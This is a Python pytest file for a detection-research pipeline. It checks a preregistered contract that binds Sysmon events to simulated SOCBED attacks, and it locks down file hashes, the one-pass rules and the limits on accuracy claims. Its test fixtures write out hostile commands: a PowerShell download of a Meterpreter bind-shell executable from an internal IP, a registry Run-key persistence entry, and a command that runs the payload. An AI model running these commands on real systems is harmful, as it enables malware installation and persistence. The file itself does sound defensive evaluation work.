from __future__ import annotations

import hashlib
import importlib.util
import json
from pathlib import Path
from types import SimpleNamespace

import pytest
import yaml


ROOT = Path(__file__).resolve().parents[1]
CONTRACT = ROOT / "external_baseline" / "p2_35g_socbed_clock_offset_binding_contract.yaml"
RUNNER = ROOT / "scripts" / "p2_35g_socbed_clock_offset_binding.py"
P2_35F_RUNNER = ROOT / "scripts" / "p2_35f_socbed_source_oracle.py"
P2_35F_RAW = ROOT / "external_baseline" / "results" / "p2_35f_8270c84" / "result.json"


def _sha256(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def _load() -> dict:
    return yaml.safe_load(CONTRACT.read_text(encoding="utf-8"))


def _module():
    spec = importlib.util.spec_from_file_location("p2_35g_runner", RUNNER)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _event(event_id: str = "1", command_line: str = "", raw: dict | None = None):
    return SimpleNamespace(
        event_id=event_id,
        command_line=command_line,
        raw=raw or {},
        timestamp="2021-01-01T00:00:00Z",
        host="CLIENT1",
        source="Microsoft-Windows-Sysmon",
    )


def test_p2_35g_is_explicitly_posthoc_not_blind() -> None:
    row = _load()
    assert row["status"] == "PREREGISTERED_AFTER_P2_35F_ZERO_MATCH_POSTHOC_DIAGNOSIS"
    pred = row["predecessor"]
    assert pred["result_main_commit"] == "d2adc22557370e2deca2ae83fddc47c2e84206b9"
    assert pred["raw_result_sha256"] == _sha256(P2_35F_RAW)
    assert pred["raw_result_sha256"] == (
        "f68eb1ecaa38a47ffb721ffb89f91c32fe92b57900f71e986e6175a023d0e215"
    )
    assert pred["p2_35f_must_remain_immutable"] is True

    exposure = row["prior_exposure"]
    assert exposure["posthoc_selected_jsonl_timestamp_and_field_scan_performed_before_this_contract"] is True
    assert exposure["posthoc_corrected_predicate_match_counts_known_before_this_contract"] is True
    assert exposure["finding_binding_for_posthoc_expanded_event_sets_scanned_before_this_contract"] is False
    assert exposure["independent_blind_benchmark"] is False


def test_p2_35g_runner_and_predecessor_are_byte_frozen() -> None:
    row = _load()
    assert row["analysis_id"] == "p2-35g-socbed-clock-offset-binding-v1"
    assert row["runner"]["sha256"] == _sha256(RUNNER)
    assert row["runner"]["sha256"] == (
        "7b05bbda83ac99de02ef83e083accf69a85814d8da79928066616a48e8570c43"
    )
    assert row["predecessor_runner"]["sha256"] == _sha256(P2_35F_RUNNER)
    assert row["predecessor_runner"]["sha256"] == (
        "6010438daef731096045fa4ebb789d09562d0b0a886e2c3ed98f3f965a57eae5"
    )
    assert row["adapter_runner"]["path"] == "scripts/p2_35e_socbed_timeline_one_pass.py"
    assert row["adapter_runner"]["sha256"] == (
        "bffd71419b11ad6e2ac1032ccfe904d7844e3a3a9f6159d6d9e7adeeeb83fca3"
    )

    module = _module()
    assert module.ANALYSIS_ID == "p2-35g-socbed-clock-offset-binding-v1"
    assert module.SCHEMA == "breachscope.p2_35g_socbed_clock_offset_binding.v1"


def test_p2_35g_two_second_preroll_and_match_counts_are_known_posthoc() -> None:
    row = _load()
    timeline = row["timeline"]
    assert timeline["pre_roll_seconds"] == 2
    assert timeline["pre_roll_selection"] == (
        "POSTHOC_FIXED_AFTER_OBSERVED_SUBSECOND_CROSS_HOST_OFFSET"
    )
    assert timeline["pre_roll_is_blind_or_independent"] is False

    measurement = row["measurement"]
    assert measurement["telemetry_presence_and_match_counts_already_known"] is True
    assert measurement["known_posthoc_match_counts"] == {
        "misc_download_malware": 15,
        "misc_set_autostart": 2,
        "misc_execute_malware": 1,
    }
    assert "per_event_exact_finding_binding" in measurement["remaining_unknown_before_canonical"]


def test_p2_35g_clock_offset_diagnosis_is_source_and_timestamp_bound() -> None:
    row = _load()
    diag = row["posthoc_diagnosis"]
    source = diag["attackconsole_source"]
    assert source["pinned_commit"] == "92ca444fac425a18141d90b09e3c9f8e7976dff4"
    assert source["sha256"] == (
        "32b3d4420dd747586ba7d08a0d27f0f5d79a519044c679fa6d63ef8806affd21"
    )
    assert source["run_attack_log_occurs_before_attack_run_call"] is True

    offset = diag["cross_host_clock_offset_evidence"]
    assert offset["misc_set_autostart"]["registry_setvalue_delta_seconds"] == pytest.approx(-0.779620)
    assert offset["misc_execute_malware"]["malware_process_create_delta_seconds"] == pytest.approx(-0.787303)


def test_p2_35g_execute_predicate_uses_normalized_exact_command_line() -> None:
    module = _module()
    exact = _event(
        event_id="1",
        command_line='"C:\\Windows\\meterpreter_bind_tcp.exe"  ',
        raw={"process": {"executable": "C:\\Windows\\meterpreter_bind_tcp.exe"}},
    )
    assert module.oracle_match("misc_execute_malware", exact) is True

    parent_cmd = _event(
        event_id="1",
        command_line='cmd /c start "" "C:\\Windows\\meterpreter_bind_tcp.exe"',
    )
    assert module.oracle_match("misc_execute_malware", parent_cmd) is False

    wrong_id = _event(
        event_id="13",
        command_line='"C:\\Windows\\meterpreter_bind_tcp.exe"',
    )
    assert module.oracle_match("misc_execute_malware", wrong_id) is False


def test_p2_35g_other_source_predicates_remain_narrow() -> None:
    module = _module()
    download = _event(
        command_line=(
            "powershell -Command Invoke-WebRequest "
            "'http://172.18.1.1/meterpreter_bind_tcp.exe' "
            "-OutFile 'C:\\Windows\\meterpreter_bind_tcp.exe'"
        )
    )
    assert module.oracle_match("misc_download_malware", download) is True

    autostart = _event(
        event_id="13",
        raw={
            "TargetObject": (
                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
                "\\Meterpreter Bind TCP"
            ),
            "Details": "meterpreter_bind_tcp.exe",
        },
    )
    assert module.oracle_match("misc_set_autostart", autostart) is True


def test_p2_35g_global_lock_is_permanent_and_second_acquisition_fails(tmp_path: Path) -> None:
    module = _module()
    lock = tmp_path / "P2_35G_ONE_PASS.lock"
    module.acquire_global_lock(lock)
    payload = json.loads(lock.read_text(encoding="utf-8"))
    assert payload["analysis_id"] == "p2-35g-socbed-clock-offset-binding-v1"
    with pytest.raises(RuntimeError, match="already permanently locked"):
        module.acquire_global_lock(lock)


def test_p2_35g_protocol_and_claim_boundary_forbid_accuracy_inflation() -> None:
    row = _load()
    protocol = row["protocol"]
    assert protocol["contract_must_merge_before_posthoc_known_event_finding_binding_scan"] is True
    assert protocol["duplicate_canonical_execution_allowed"] is False
    assert protocol["replace_result_for_better_outcome"] is False
    assert protocol["window_or_predicate_change_requires_new_analysis_id"] is True
    assert protocol["product_or_rule_change_before_measurement_allowed"] is False
    assert protocol["p2_35f_artifacts_must_remain_immutable"] is True

    claim = row["claim_boundary"]
    assert claim["evaluated_actions"] == "THREE_POSTHOC_KNOWN_WINDOWS_EVENT_SETS_ONLY"
    assert claim["telemetry_predicate_match_counts"] == "KNOWN_POSTHOC_BEFORE_CONTRACT"
    assert claim["source_derived_oracle_event_binding"] == "NOT_YET_MEASURED"
    assert claim["pre_roll_seconds"] == "POSTHOC_FIXED_2_SECONDS"
    assert claim["attack_level_precision"] == "NOT_EVALUATED"
    assert claim["attack_level_recall"] == "NOT_EVALUATED"
    assert claim["event_level_precision"] == "NOT_EVALUATED"
    assert claim["event_level_recall"] == "NOT_EVALUATED"
    assert claim["eight_attack_recall"] == "NOT_EVALUATED"
    assert claim["independent_holdout_performance"] == "NOT_EVALUATED"
    assert claim["general_detection_accuracy"] == "NOT_CLAIMED"
    assert claim["statistical_benchmark"] is False
